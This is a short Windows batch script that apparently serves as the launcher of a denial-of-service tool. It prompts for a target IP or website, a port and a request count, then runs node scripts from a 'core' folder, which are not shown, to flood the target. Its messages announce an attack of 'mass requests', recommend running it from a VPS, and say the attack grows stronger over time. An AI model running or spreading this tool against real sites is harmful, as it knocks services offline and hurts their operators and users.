@echo off
:start
set /p tar=[+] - Target IP/Website : 
set /p port=[+] - Port : 
set /p req=[+] - Requests : 
cls
color c
echo [!] WARNING - This script will send mass requests to the website.
echo [!] WARNING - This is recommended to use it on a VPS
echo [!] WARNING - Use it for private usage
echo [!] HELP - It's a snowball effect, longer you let the script on, attack will be most powerful with time.
echo [!] WARNING - Press ENTER to start the attack.
pause > nul
color
cls
cd core
node console.js
node index.js %tar% %port% %req%
pause
goto :start